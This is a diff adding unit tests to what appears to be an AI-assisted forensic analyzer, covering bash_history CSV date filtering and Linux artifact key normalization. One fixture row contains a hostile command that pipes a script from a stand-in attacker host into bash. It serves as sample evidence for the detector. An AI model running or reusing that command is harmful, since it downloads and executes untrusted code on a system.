@@ -799,6 +799,59 @@ class AnalyzerTests(unittest.TestCase):
         self.assertEqual(audit.entries[0][0], "analysis_started")
         self.assertEqual(audit.entries[-1][0], "analysis_completed")
 
+    def test_prepare_artifact_data_with_linux_bash_history(self) -> None:
+        """Data prep pipeline should handle Linux bash_history CSV with date filtering."""
+        with TemporaryDirectory(prefix="aift-analyzer-test-") as temp_dir:
+            temp_path = Path(temp_dir)
+            prompts_dir = temp_path / "prompts"
+            self._write_prompt_template(prompts_dir)
+            linux_dir = prompts_dir / "artifact_instructions_linux"
+            linux_dir.mkdir(parents=True, exist_ok=True)
+            (linux_dir / "bash_history.md").write_text(
+                "Look for suspicious commands.", encoding="utf-8",
+            )
+
+            csv_path = temp_path / "bash_history.csv"
+            with csv_path.open("w", newline="", encoding="utf-8") as handle:
+                writer = csv.DictWriter(handle, fieldnames=["ts", "command", "shell", "username"])
+                writer.writeheader()
+                writer.writerow({
+                    "ts": "2026-01-15T10:00:00+00:00",
+                    "command": "curl http://evil.example.com/payload.sh | bash",
+                    "shell": "/bin/bash",
+                    "username": "root",
+                })
+                writer.writerow({
+                    "ts": "2026-01-15T11:00:00+00:00",
+                    "command": "whoami",
+                    "shell": "/bin/bash",
+                    "username": "root",
+                })
+                writer.writerow({
+                    "ts": "2025-06-01T08:00:00+00:00",
+                    "command": "ls",
+                    "shell": "/bin/bash",
+                    "username": "admin",
+                })
+
+            analyzer = ForensicAnalyzer(
+                artifact_csv_paths={"bash_history": csv_path},
+                prompts_dir=prompts_dir,
+                random_seed=7,
+                os_type="linux",
+            )
+            filled_prompt = analyzer._prepare_artifact_data(
+                artifact_key="bash_history",
+                investigation_context="Focus on January 15, 2026.",
+            )
+
+        # The two January 2026 rows should survive date filtering; the June
+        # 2025 row should be dropped.
+        self.assertIn("curl", filled_prompt)
+        self.assertIn("whoami", filled_prompt)
+        self.assertNotIn("admin", filled_prompt)
+        self.assertIn("Artifact=Bash History", filled_prompt)
+
     def test_analyze_artifact_passes_csv_attachment_when_provider_supports_it(self) -> None:
         with TemporaryDirectory(prefix="aift-analyzer-test-") as temp_dir:
             temp_path = Path(temp_dir)
@@ -2456,6 +2509,27 @@ class TestNormalizeArtifactKey(unittest.TestCase):
     def test_unknown_key_lowered(self) -> None:
         from app.analyzer.utils import normalize_artifact_key
         self.assertEqual(normalize_artifact_key("CustomArtifact"), "customartifact")
+
+    def test_linux_artifact_keys_pass_through(self) -> None:
+        """Linux artifact keys should normalize to themselves (no special-case rewriting)."""
+        from app.analyzer.utils import normalize_artifact_key
+
+        linux_keys = [
+            "bash_history", "zsh_history", "fish_history", "python_history",
+            "wtmp", "btmp", "lastlog", "users", "groups", "sudoers",
+            "cronjobs", "syslog", "journalctl", "packagemanager",
+            "ssh.authorized_keys", "ssh.known_hosts", "network.interfaces",
+        ]
+        for key in linux_keys:
+            self.assertEqual(
+                normalize_artifact_key(key), key,
+                f"Linux key '{key}' should pass through unchanged",
+            )
+
+    def test_services_normalizes_for_both_os(self) -> None:
+        """The shared 'services' key should normalize consistently."""
+        from app.analyzer.utils import normalize_artifact_key
+        self.assertEqual(normalize_artifact_key("services"), "services")
 
 
 class TestNormalizeOsType(unittest.TestCase):
